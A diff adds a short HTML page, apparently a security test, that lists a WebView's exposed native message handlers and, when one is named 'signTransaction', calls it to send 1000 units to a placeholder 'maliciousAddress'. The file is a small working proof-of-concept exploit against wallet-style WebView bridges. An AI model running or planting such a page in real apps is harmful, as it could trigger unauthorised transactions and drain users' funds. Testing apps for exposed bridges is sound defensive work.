@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebView Enumeration and Test</title>
+</head>
+
+<body>
+
+    <h2>Exposed Methods:</h2>
+    <ul id="methodList"></ul>
+    <div id="feedbackDiv"></div>
+
+    <script>
+        // Enumerate the exposed methods
+        for (let key in window.webkit.messageHandlers) {
+            let listItem = document.createElement('li');
+            listItem.textContent = key;
+            document.getElementById('methodList').appendChild(listItem);
+            
+            // If signTransaction is found, attempt to invoke it
+            if (key === 'signTransaction') {
+                try {
+                    window.webkit.messageHandlers.signTransaction.postMessage({
+                        'amount': '1000',
+                        'toAddress': 'maliciousAddress'
+                    });
+                    displayMessage("Attempted to sign transaction via 'signTransaction' method.");
+                } catch (error) {
+                    displayMessage("Error while trying 'signTransaction': " + error.toString());
+                }
+            }
+        }
+
+        function displayMessage(message) {
+            let feedback = document.createElement('p');
+            feedback.textContent = message;
+            document.getElementById('feedbackDiv').appendChild(feedback);
+        }
+    </script>
+
+</body>
+
+</html>
